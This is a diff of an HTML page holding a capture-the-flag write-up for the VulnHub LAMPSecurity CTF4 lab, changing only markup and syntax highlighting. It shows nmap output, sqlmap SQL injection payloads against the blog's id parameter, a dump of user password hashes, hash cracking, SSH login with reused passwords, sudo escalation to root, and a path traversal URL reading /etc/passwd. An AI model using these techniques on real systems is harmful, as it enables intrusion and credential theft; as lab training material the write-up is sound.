@@ -97,12 +97,12 @@
             <p>I start the LAMPSecurity CTF4 challenge of vulnhub
 <a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/">available here</a>.
 The goal is to get a root shell on the server.</p>
-<h1 id="discovery">Discovery</h1>
+<h1>Discovery</h1>
 <p>First of all we need to determine the IP address of the server.
 Since we launch it in a bridged virtual machine the local router got the IP
 address in the DHCP logs. We simply found the most recent one. For me it is
 <code>192.168.1.56</code>.</p>
-<h2 id="nmap">Nmap</h2>
+<h2>Nmap</h2>
 <p>Let start with a simple nmap</p>
 <div class="highlight"><pre><span></span><span class="p">#</span><span class="nn">nmap</span> <span class="nt">-A</span> <span class="nt">-oA</span> <span class="nt">ctf4</span> <span class="nt">192</span><span class="p">.</span><span class="nc">168</span><span class="p">.</span><span class="nc">1</span><span class="p">.</span><span class="nc">56</span>
 <span class="nt">Nmap</span> <span class="nt">6</span><span class="p">.</span><span class="nc">47</span> <span class="nt">scan</span> <span class="nt">initiated</span> <span class="nt">Thu</span> <span class="nt">Aug</span> <span class="nt">28</span> <span class="nt">18</span><span class="p">:</span><span class="nd">49</span><span class="p">:</span><span class="nd">49</span> <span class="nt">2014</span> <span class="nt">as</span><span class="o">:</span> <span class="nt">nmap</span> <span class="nt">-A</span> <span class="nt">-oA</span> <span class="nt">ctf4</span> <span class="nt">192</span><span class="p">.</span><span class="nc">168</span><span class="p">.</span><span class="nc">1</span><span class="p">.</span><span class="nc">56</span>
@@ -116,7 +116,7 @@ address in the DHCP logs. We simply found the most recent one. For me it is
 <span class="o">|</span><span class="nt">_</span>  <span class="nt">2048</span> <span class="nt">e7</span><span class="p">:</span><span class="nd">70</span><span class="p">:</span><span class="nd">d3</span><span class="p">:</span><span class="nd">81</span><span class="p">:</span><span class="nd">00</span><span class="p">:</span><span class="nd">41</span><span class="p">:</span><span class="nd">b8</span><span class="p">:</span><span class="nd">6e</span><span class="p">:</span><span class="nd">fd</span><span class="p">:</span><span class="nd">31</span><span class="p">:</span><span class="nd">ae</span><span class="p">:</span><span class="nd">0e</span><span class="p">:</span><span class="nd">00</span><span class="p">:</span><span class="nd">ea</span><span class="p">:</span><span class="nd">5c</span><span class="p">:</span><span class="nd">b4</span> <span class="o">(</span><span class="nt">RSA</span><span class="o">)</span>
 <span class="nt">25</span><span class="o">/</span><span class="nt">tcp</span>  <span class="nt">open</span>   <span class="nt">smtp</span>    <span class="nt">Sendmail</span> <span class="nt">8</span><span class="p">.</span><span class="nc">13</span><span class="p">.</span><span class="nc">5</span><span class="o">/</span><span class="nt">8</span><span class="p">.</span><span class="nc">13</span><span class="p">.</span><span class="nc">5</span>
 <span class="o">|</span> <span class="nt">smtp-commands</span><span class="o">:</span> <span class="nt">ctf4</span><span class="p">.</span><span class="nc">sas</span><span class="p">.</span><span class="nc">upenn</span><span class="p">.</span><span class="nc">edu</span> <span class="nt">Hello</span> <span class="cp">[</span><span class="mf">192.168.1.97</span><span class="cp">]</span><span class="o">,</span> <span class="nt">pleased</span> <span class="nt">to</span> <span class="nt">meet</span> <span class="nt">you</span><span class="o">,</span> <span class="nt">ENHANCEDSTATUSCODES</span><span class="o">,</span> <span class="nt">PIPELINING</span><span class="o">,</span> <span class="nt">EXPN</span><span class="o">,</span> <span class="nt">VERB</span><span class="o">,</span> <span class="nt">8BITMIME</span><span class="o">,</span> <span class="nt">SIZE</span><span class="o">,</span> <span class="nt">DSN</span><span class="o">,</span> <span class="nt">ETRN</span><span class="o">,</span> <span class="nt">DELIVERBY</span><span class="o">,</span> <span class="nt">HELP</span><span class="o">,</span>
-<span class="o">|</span><span class="nt">_</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">This</span> <span class="nt">is</span> <span class="nt">sendmail</span> <span class="nt">version</span> <span class="nt">8</span><span class="p">.</span><span class="nc">13</span><span class="p">.</span><span class="nc">5</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">Topics</span><span class="o">:</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">HELO</span> <span class="nt">EHLO</span> <span class="nt">MAIL</span> <span class="nt">RCPT</span> <span class="nt">DATA</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">RSET</span> <span class="nt">NOOP</span> <span class="nt">QUIT</span> <span class="nt">HELP</span> <span class="nt">VRFY</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">EXPN</span> <span class="nt">VERB</span> <span class="nt">ETRN</span> <span class="nt">DSN</span> <span class="nt">AUTH</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">STARTTLS</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">For</span> <span class="nt">more</span> <span class="nt">info</span> <span class="nt">use</span> <span class="s2">&quot;HELP &lt;topic&gt;&quot;</span><span class="o">.</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">To</span> <span class="nt">report</span> <span class="nt">bugs</span> <span class="nt">in</span> <span class="nt">the</span> <span class="nt">implementation</span> <span class="nt">send</span> <span class="nt">email</span> <span class="nt">to</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">sendmail-bugs</span><span class="p">@</span><span class="k">sendmail</span><span class="p">.</span><span class="nc">org</span><span class="o">.</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">For</span> <span class="nt">local</span> <span class="nt">information</span> <span class="nt">send</span> <span class="nt">email</span> <span class="nt">to</span> <span class="nt">Postmaster</span> <span class="nt">at</span> <span class="nt">your</span> <span class="nt">site</span><span class="o">.</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">End</span> <span class="nt">of</span> <span class="nt">HELP</span> <span class="nt">info</span>
+<span class="o">|</span><span class="nt">_</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">This</span> <span class="nt">is</span> <span class="nt">sendmail</span> <span class="nt">version</span> <span class="nt">8</span><span class="p">.</span><span class="nc">13</span><span class="p">.</span><span class="nc">5</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">Topics</span><span class="o">:</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">HELO</span> <span class="nt">EHLO</span> <span class="nt">MAIL</span> <span class="nt">RCPT</span> <span class="nt">DATA</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">RSET</span> <span class="nt">NOOP</span> <span class="nt">QUIT</span> <span class="nt">HELP</span> <span class="nt">VRFY</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">EXPN</span> <span class="nt">VERB</span> <span class="nt">ETRN</span> <span class="nt">DSN</span> <span class="nt">AUTH</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">STARTTLS</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">For</span> <span class="nt">more</span> <span class="nt">info</span> <span class="nt">use</span> <span class="s2">&quot;HELP &amp;lt;topic&amp;gt;&quot;</span><span class="o">.</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">To</span> <span class="nt">report</span> <span class="nt">bugs</span> <span class="nt">in</span> <span class="nt">the</span> <span class="nt">implementation</span> <span class="nt">send</span> <span class="nt">email</span> <span class="nt">to</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">sendmail-bugs</span><span class="p">@</span><span class="k">sendmail</span><span class="p">.</span><span class="nc">org</span><span class="o">.</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">For</span> <span class="nt">local</span> <span class="nt">information</span> <span class="nt">send</span> <span class="nt">email</span> <span class="nt">to</span> <span class="nt">Postmaster</span> <span class="nt">at</span> <span class="nt">your</span> <span class="nt">site</span><span class="o">.</span> <span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">0</span> <span class="nt">End</span> <span class="nt">of</span> <span class="nt">HELP</span> <span class="nt">info</span>
 <span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span>  <span class="nt">open</span>   <span class="nt">http</span>    <span class="nt">Apache</span> <span class="nt">httpd</span> <span class="nt">2</span><span class="p">.</span><span class="nc">2</span><span class="p">.</span><span class="nc">0</span> <span class="o">((</span><span class="nt">Fedora</span><span class="o">))</span>
 <span class="o">|</span><span class="nt">_http-methods</span><span class="o">:</span> <span class="nt">No</span> <span class="nt">Allow</span> <span class="nt">or</span> <span class="nt">Public</span> <span class="nt">header</span> <span class="nt">in</span> <span class="nt">OPTIONS</span> <span class="nt">response</span> <span class="o">(</span><span class="nt">status</span> <span class="nt">code</span> <span class="nt">200</span><span class="o">)</span>
 <span class="o">|</span> <span class="nt">http-robots</span><span class="p">.</span><span class="nc">txt</span><span class="o">:</span> <span class="nt">5</span> <span class="nt">disallowed</span> <span class="nt">entries</span>
@@ -136,127 +136,127 @@ address in the DHCP logs. We simply found the most recent one. For me it is
 <li>a web service on port 80, note that there is five disallowed entries in robots.txt</li>
 <li>and a close CUPS service on port 631.</li>
 </ul>
-<h2 id="the-website">The website</h2>
+<h2>The website</h2>
 <p>Let's take a look at the web site. It is a simple blog site with a XSS flaw on
 the search engine.</p>
 <p>The article are indexed with a GET parameter id. This parameter is vulnerable to
 an SQL injection.</p>
-<h1 id="exploitation">Exploitation</h1>
-<h2 id="sqlmap">Sqlmap</h2>
+<h1>Exploitation</h1>
+<h2>Sqlmap</h2>
 <p>We launch sqlmap:</p>
-<div class="highlight"><pre><span></span>#sqlmap -u &#39;http://192.168.1.56/index.html?page=blog&amp;title=Blog&amp;id=6&#39; -p id --tables
-  sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
-  ---
-  Place: GET
-  Parameter: id
-      Type: boolean-based blind
-      Title: AND boolean-based blind - WHERE or HAVING clause
-      Payload: page=blog&amp;title=Blog&amp;id=6 AND 2396=2396
+<div class="highlight"><pre><span></span><span class="p">#</span><span class="nn">sqlmap</span> <span class="nt">-u</span> <span class="s1">&#39;http://192.168.1.56/index.html?page=blog&amp;amp;title=Blog&amp;amp;id=6&#39;</span> <span class="nt">-p</span> <span class="nt">id</span> <span class="nt">--tables</span>
+  <span class="nt">sqlmap</span> <span class="nt">identified</span> <span class="nt">the</span> <span class="nt">following</span> <span class="nt">injection</span> <span class="nt">points</span> <span class="nt">with</span> <span class="nt">a</span> <span class="nt">total</span> <span class="nt">of</span> <span class="nt">0</span> <span class="nt">HTTP</span><span class="o">(</span><span class="nt">s</span><span class="o">)</span> <span class="nt">requests</span><span class="o">:</span>
+  <span class="nt">---</span>
+  <span class="nt">Place</span><span class="o">:</span> <span class="nt">GET</span>
+  <span class="nt">Parameter</span><span class="o">:</span> <span class="nt">id</span>
+      <span class="nt">Type</span><span class="o">:</span> <span class="nt">boolean-based</span> <span class="nt">blind</span>
+      <span class="nt">Title</span><span class="o">:</span> <span class="nt">AND</span> <span class="nt">boolean-based</span> <span class="nt">blind</span> <span class="nt">-</span> <span class="nt">WHERE</span> <span class="nt">or</span> <span class="nt">HAVING</span> <span class="nt">clause</span>
+      <span class="nt">Payload</span><span class="o">:</span> <span class="nt">page</span><span class="o">=</span><span class="nt">blog</span><span class="o">&amp;</span><span class="nt">amp</span><span class="o">;</span><span class="nt">title</span><span class="o">=</span><span class="nt">Blog</span><span class="o">&amp;</span><span class="nt">amp</span><span class="o">;</span><span class="nt">id</span><span class="o">=</span><span class="nt">6</span> <span class="nt">AND</span> <span class="nt">2396</span><span class="o">=</span><span class="nt">2396</span>
 
-      Type: UNION query
-      Title: MySQL UNION query (NULL) - 5 columns
-      Payload: page=blog&amp;title=Blog&amp;id=6 UNION ALL SELECT NULL,CONCAT(0x7172756f71,0x494c647a675a47595a55,0x7178657471),NULL,NULL,NULL#
+      <span class="nt">Type</span><span class="o">:</span> <span class="nt">UNION</span> <span class="nt">query</span>
+      <span class="nt">Title</span><span class="o">:</span> <span class="nt">MySQL</span> <span class="nt">UNION</span> <span class="nt">query</span> <span class="o">(</span><span class="nt">NULL</span><span class="o">)</span> <span class="nt">-</span> <span class="nt">5</span> <span class="nt">columns</span>
+      <span class="nt">Payload</span><span class="o">:</span> <span class="nt">page</span><span class="o">=</span><span class="nt">blog</span><span class="o">&amp;</span><span class="nt">amp</span><span class="o">;</span><span class="nt">title</span><span class="o">=</span><span class="nt">Blog</span><span class="o">&amp;</span><span class="nt">amp</span><span class="o">;</span><span class="nt">id</span><span class="o">=</span><span class="nt">6</span> <span class="nt">UNION</span> <span class="nt">ALL</span> <span class="nt">SELECT</span> <span class="nt">NULL</span><span class="o">,</span><span class="nt">CONCAT</span><span class="o">(</span><span class="nt">0x7172756f71</span><span class="o">,</span><span class="nt">0x494c647a675a47595a55</span><span class="o">,</span><span class="nt">0x7178657471</span><span class="o">),</span><span class="nt">NULL</span><span class="o">,</span><span class="nt">NULL</span><span class="o">,</span><span class="nt">NULL</span><span class="err">#</span>
 
-      Type: AND/OR time-based blind
-      Title: MySQL &gt; 5.0.11 AND time-based blind
-      Payload: page=blog&amp;title=Blog&amp;id=6 AND SLEEP(5)
-  ---
-  [19:44:24] [INFO] the back-end DBMS is MySQL
-  web server operating system: Linux Fedora 5 (Bordeaux)
-  web application technology: Apache 2.2.0, PHP 5.1.2
-  back-end DBMS: MySQL 5.0.11
-  [19:44:24] [INFO] fetching database names
-  [19:44:24] [INFO] fetching tables for databases: &#39;calendar, ehks, information_schema, mysql, roundcubemail, test&#39;
-  Database: calendar
-  [5 tables]
-  +---------------------------------------+
-  | phpc_calendars                        |
-  | phpc_events                           |
-  | phpc_sequence                         |
-  | phpc_users                            |
-  | uid                                   |
-  +---------------------------------------+
+      <span class="nt">Type</span><span class="o">:</span> <span class="nt">AND</span><span class="o">/</span><span class="nt">OR</span> <span class="nt">time-based</span> <span class="nt">blind</span>
+      <span class="nt">Title</span><span class="o">:</span> <span class="nt">MySQL</span> <span class="o">&amp;</span><span class="nt">gt</span><span class="o">;</span> <span class="nt">5</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">11</span> <span class="nt">AND</span> <span class="nt">time-based</span> <span class="nt">blind</span>
+      <span class="nt">Payload</span><span class="o">:</span> <span class="nt">page</span><span class="o">=</span><span class="nt">blog</span><span class="o">&amp;</span><span class="nt">amp</span><span class="o">;</span><span class="nt">title</span><span class="o">=</span><span class="nt">Blog</span><span class="o">&amp;</span><span class="nt">amp</span><span class="o">;</span><span class="nt">id</span><span class="o">=</span><span class="nt">6</span> <span class="nt">AND</span> <span class="nt">SLEEP</span><span class="o">(</span><span class="nt">5</span><span class="o">)</span>
+  <span class="nt">---</span>
+  <span class="cp">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">24</span><span class="cp">]</span> <span class="cp">[</span><span class="nx">INFO</span><span class="cp">]</span> <span class="nt">the</span> <span class="nt">back-end</span> <span class="nt">DBMS</span> <span class="nt">is</span> <span class="nt">MySQL</span>
+  <span class="nt">web</span> <span class="nt">server</span> <span class="nt">operating</span> <span class="nt">system</span><span class="o">:</span> <span class="nt">Linux</span> <span class="nt">Fedora</span> <span class="nt">5</span> <span class="o">(</span><span class="nt">Bordeaux</span><span class="o">)</span>
+  <span class="nt">web</span> <span class="nt">application</span> <span class="nt">technology</span><span class="o">:</span> <span class="nt">Apache</span> <span class="nt">2</span><span class="p">.</span><span class="nc">2</span><span class="p">.</span><span class="nc">0</span><span class="o">,</span> <span class="nt">PHP</span> <span class="nt">5</span><span class="p">.</span><span class="nc">1</span><span class="p">.</span><span class="nc">2</span>
+  <span class="nt">back-end</span> <span class="nt">DBMS</span><span class="o">:</span> <span class="nt">MySQL</span> <span class="nt">5</span><span class="p">.</span><span class="nc">0</span><span class="p">.</span><span class="nc">11</span>
+  <span class="cp">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">24</span><span class="cp">]</span> <span class="cp">[</span><span class="nx">INFO</span><span class="cp">]</span> <span class="nt">fetching</span> <span class="nt">database</span> <span class="nt">names</span>
+  <span class="cp">[</span><span class="mi">19</span><span class="p">:</span><span class="mi">44</span><span class="p">:</span><span class="mi">24</span><span class="cp">]</span> <span class="cp">[</span><span class="nx">INFO</span><span class="cp">]</span> <span class="nt">fetching</span> <span class="nt">tables</span> <span class="nt">for</span> <span class="nt">databases</span><span class="o">:</span> <span class="s1">&#39;calendar, ehks, information_schema, mysql, roundcubemail, test&#39;</span>
+  <span class="nt">Database</span><span class="o">:</span> <span class="nt">calendar</span>
+  <span class="cp">[</span><span class="mi">5</span> <span class="nx">tables</span><span class="cp">]</span>
+  <span class="o">+</span><span class="nt">---------------------------------------</span><span class="o">+</span>
+  <span class="o">|</span> <span class="nt">phpc_calendars</span>                        <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">phpc_events</span>                           <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">phpc_sequence</span>                         <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">phpc_users</span>                            <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">uid</span>                                   <span class="o">|</span>
+  <span class="o">+</span><span class="nt">---------------------------------------</span><span class="o">+</span>
 
-  Database: roundcubemail
-  [6 tables]
-  +---------------------------------------+
-  | session                               |
-  | cache                                 |
-  | contacts                              |
-  | identities                            |
-  | messages                              |
-  | users                                 |
-  +---------------------------------------+
+  <span class="nt">Database</span><span class="o">:</span> <span class="nt">roundcubemail</span>
+  <span class="cp">[</span><span class="mi">6</span> <span class="nx">tables</span><span class="cp">]</span>
+  <span class="o">+</span><span class="nt">---------------------------------------</span><span class="o">+</span>
+  <span class="o">|</span> <span class="nt">session</span>                               <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">cache</span>                                 <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">contacts</span>                              <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">identities</span>                            <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">messages</span>                              <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">users</span>                                 <span class="o">|</span>
+  <span class="o">+</span><span class="nt">---------------------------------------</span><span class="o">+</span>
 
-  Database: ehks
-  [3 tables]
-  +---------------------------------------+
-  | user                                  |
-  | blog                                  |
-  | comment                               |
-  +---------------------------------------+
+  <span class="nt">Database</span><span class="o">:</span> <span class="nt">ehks</span>
+  <span class="cp">[</span><span class="mi">3</span> <span class="nx">tables</span><span class="cp">]</span>
+  <span class="o">+</span><span class="nt">---------------------------------------</span><span class="o">+</span>
+  <span class="o">|</span> <span class="nt">user</span>                                  <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">blog</span>                                  <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">comment</span>                               <span class="o">|</span>
+  <span class="o">+</span><span class="nt">---------------------------------------</span><span class="o">+</span>
 
-  Database: information_schema
-  [16 tables]
-  +---------------------------------------+
-  | CHARACTER_SETS                        |
-  | COLLATIONS                            |
-  | COLLATION_CHARACTER_SET_APPLICABILITY |
-  | COLUMNS                               |
-  | COLUMN_PRIVILEGES                     |
-  | KEY_COLUMN_USAGE                      |
-  | ROUTINES                              |
-  | SCHEMATA                              |
-  | SCHEMA_PRIVILEGES                     |
-  | STATISTICS                            |
-  | TABLES                                |
-  | TABLE_CONSTRAINTS                     |
-  | TABLE_PRIVILEGES                      |
-  | TRIGGERS                              |
-  | USER_PRIVILEGES                       |
-  | VIEWS                                 |
-  +---------------------------------------+
+  <span class="nt">Database</span><span class="o">:</span> <span class="nt">information_schema</span>
+  <span class="cp">[</span><span class="mi">16</span> <span class="nx">tables</span><span class="cp">]</span>
+  <span class="o">+</span><span class="nt">---------------------------------------</span><span class="o">+</span>
+  <span class="o">|</span> <span class="nt">CHARACTER_SETS</span>                        <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">COLLATIONS</span>                            <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">COLLATION_CHARACTER_SET_APPLICABILITY</span> <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">COLUMNS</span>                               <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">COLUMN_PRIVILEGES</span>                     <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">KEY_COLUMN_USAGE</span>                      <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">ROUTINES</span>                              <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">SCHEMATA</span>                              <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">SCHEMA_PRIVILEGES</span>                     <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">STATISTICS</span>                            <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">TABLES</span>                                <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">TABLE_CONSTRAINTS</span>                     <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">TABLE_PRIVILEGES</span>                      <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">TRIGGERS</span>                              <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">USER_PRIVILEGES</span>                       <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">VIEWS</span>                                 <span class="o">|</span>
+  <span class="o">+</span><span class="nt">---------------------------------------</span><span class="o">+</span>
 
-  Database: mysql
-  [17 tables]
-  +---------------------------------------+
-  | user                                  |
-  | columns_priv                          |
-  | db                                    |
-  | func                                  |
-  | help_category                         |
-  | help_keyword                          |
-  | help_relation                         |
-  | help_topic                            |
-  | host                                  |
-  | proc                                  |
-  | procs_priv                            |
-  | tables_priv                           |
-  | time_zone                             |
-  | time_zone_leap_second                 |
-  | time_zone_name                        |
-  | time_zone_transition                  |
-  | time_zone_transition_type             |
-  +---------------------------------------+
+  <span class="nt">Database</span><span class="o">:</span> <span class="nt">mysql</span>
+  <span class="cp">[</span><span class="mi">17</span> <span class="nx">tables</span><span class="cp">]</span>
+  <span class="o">+</span><span class="nt">---------------------------------------</span><span class="o">+</span>
+  <span class="o">|</span> <span class="nt">user</span>                                  <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">columns_priv</span>                          <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">db</span>                                    <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">func</span>                                  <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">help_category</span>                         <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">help_keyword</span>                          <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">help_relation</span>                         <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">help_topic</span>                            <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">host</span>                                  <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">proc</span>                                  <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">procs_priv</span>                            <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">tables_priv</span>                           <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">time_zone</span>                             <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">time_zone_leap_second</span>                 <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">time_zone_name</span>                        <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">time_zone_transition</span>                  <span class="o">|</span>
+  <span class="o">|</span> <span class="nt">time_zone_transition_type</span>             <span class="o">|</span>
+  <span class="o">+</span><span class="nt">---------------------------------------</span><span class="o">+</span>
 </pre></div>
 
 
 <p>Okay so there is a lot of database let's dump the ehks users table:</p>
-<div class="highlight"><pre><span></span># sqlmap -u &#39;http://192.168.1.56/index.html?page=blog&amp;title=Blog&amp;id=6&#39; -p id -D  ehks -T user --dump
-+---------+-----------+----------------------------------+
-| user_id | user_name | user_pass                        |
-+---------+-----------+----------------------------------+
-| 1       | dstevens  | 02e823a15a392b5aa4ff4ccb9060fa68 |
-| 2       | achen     | b46265f1e7faa3beab09db5c28739380 |
-| 3       | pmoore    | 8f4743c04ed8e5f39166a81f26319bb5 |
-| 4       | jdurbin   | 7c7bc9f465d86b8164686ebb5151a717 |
-| 5       | sorzek    | 64d1f88b9b276aece4b0edcc25b7a434 |
-| 6       | ghighland | 9f3eb3087298ff21843cc4e013cf355f |
-+---------+-----------+----------------------------------+
+<div class="highlight"><pre><span></span><span class="err">#</span> <span class="nt">sqlmap</span> <span class="nt">-u</span> <span class="s1">&#39;http://192.168.1.56/index.html?page=blog&amp;amp;title=Blog&amp;amp;id=6&#39;</span> <span class="nt">-p</span> <span class="nt">id</span> <span class="nt">-D</span>  <span class="nt">ehks</span> <span class="nt">-T</span> <span class="nt">user</span> <span class="nt">--dump</span>
+<span class="o">+</span><span class="nt">---------</span><span class="o">+</span><span class="nt">-----------</span><span class="o">+</span><span class="nt">----------------------------------</span><span class="o">+</span>
+<span class="o">|</span> <span class="nt">user_id</span> <span class="o">|</span> <span class="nt">user_name</span> <span class="o">|</span> <span class="nt">user_pass</span>                        <span class="o">|</span>
+<span class="o">+</span><span class="nt">---------</span><span class="o">+</span><span class="nt">-----------</span><span class="o">+</span><span class="nt">----------------------------------</span><span class="o">+</span>
+<span class="o">|</span> <span class="nt">1</span>       <span class="o">|</span> <span class="nt">dstevens</span>  <span class="o">|</span> <span class="nt">02e823a15a392b5aa4ff4ccb9060fa68</span> <span class="o">|</span>
+<span class="o">|</span> <span class="nt">2</span>       <span class="o">|</span> <span class="nt">achen</span>     <span class="o">|</span> <span class="nt">b46265f1e7faa3beab09db5c28739380</span> <span class="o">|</span>
+<span class="o">|</span> <span class="nt">3</span>       <span class="o">|</span> <span class="nt">pmoore</span>    <span class="o">|</span> <span class="nt">8f4743c04ed8e5f39166a81f26319bb5</span> <span class="o">|</span>
+<span class="o">|</span> <span class="nt">4</span>       <span class="o">|</span> <span class="nt">jdurbin</span>   <span class="o">|</span> <span class="nt">7c7bc9f465d86b8164686ebb5151a717</span> <span class="o">|</span>
+<span class="o">|</span> <span class="nt">5</span>       <span class="o">|</span> <span class="nt">sorzek</span>    <span class="o">|</span> <span class="nt">64d1f88b9b276aece4b0edcc25b7a434</span> <span class="o">|</span>
+<span class="o">|</span> <span class="nt">6</span>       <span class="o">|</span> <span class="nt">ghighland</span> <span class="o">|</span> <span class="nt">9f3eb3087298ff21843cc4e013cf355f</span> <span class="o">|</span>
+<span class="o">+</span><span class="nt">---------</span><span class="o">+</span><span class="nt">-----------</span><span class="o">+</span><span class="nt">----------------------------------</span><span class="o">+</span>
 </pre></div>
 
 
-<h2 id="cracking-the-hashes">Cracking the hashes</h2>
+<h2>Cracking the hashes</h2>
 <p>We save the hahses in a file (option proposed by sqlmap) and we launch john the
 ripper on it:</p>
 <div class="highlight"><pre><span></span>#john hashes --format=raw-md5
@@ -279,7 +279,7 @@ undone9999. We cracked an other password:</p>
 </pre></div>
 
 
-<h2 id="ssh-connexions">SSH connexions</h2>
+<h2>SSH connexions</h2>
 <p>Okay the same password seems to be used everywhere and I was a bit lost to how
 to continue so I try the credentials on the ssh service: <em>it works!</em></p>
 <p>First of all I logged with the jdurbin account.
@@ -287,13 +287,13 @@ There seems to be anything useful but in my search I saw that achen had an
 ssh private key readable by everyone (a ppk one for PuTTY).
 Okay lets use it to connect on the machine. It ask no password and we got a
 shell, what now?</p>
-<h2 id="privileges-escalation">Privileges escalation</h2>
+<h2>Privileges escalation</h2>
 <p>I try to see what was the differences with this account and I saw a pdf file
 "linux_administration.pdf" so I tried to use the sudo command with <code>sudo -v</code> and
 once again: <em>it works!</em>
 So a simple <code>sudo su</code> give us the root rights.</p>
 <p><em>DONE!</em></p>
-<h1 id="summary">Summary</h1>
+<h1>Summary</h1>
 <p>Lets resume :</p>
 <ol>
 <li>exploitation of the SQL injection</li>
@@ -304,10 +304,10 @@ So a simple <code>sudo su</code> give us the root rights.</p>
 <li>sudo su</li>
 </ol>
 <p>That was a easy one !</p>
-<h1 id="nota-bene">Nota bene</h1>
+<h1>Nota bene</h1>
 <p>Oh yeah we do not explore the lead of the file injection in the
 page GET parameter:</p>
-<div class="highlight"><pre><span></span>http://192.168.1.56/index.html?page=../../../../../../etc/passwd%00&amp;title=Blog&amp;id=5
+<div class="highlight"><pre><span></span><span class="nt">http</span><span class="o">://</span><span class="nt">192</span><span class="p">.</span><span class="nc">168</span><span class="p">.</span><span class="nc">1</span><span class="p">.</span><span class="nc">56</span><span class="o">/</span><span class="nt">index</span><span class="p">.</span><span class="nc">html</span><span class="o">?</span><span class="nt">page</span><span class="o">=../../../../../../</span><span class="nt">etc</span><span class="o">/</span><span class="nt">passwd</span><span class="o">%</span><span class="nt">00</span><span class="o">&amp;</span><span class="nt">amp</span><span class="o">;</span><span class="nt">title</span><span class="o">=</span><span class="nt">Blog</span><span class="o">&amp;</span><span class="nt">amp</span><span class="o">;</span><span class="nt">id</span><span class="o">=</span><span class="nt">5</span>
 </pre></div>
 
 
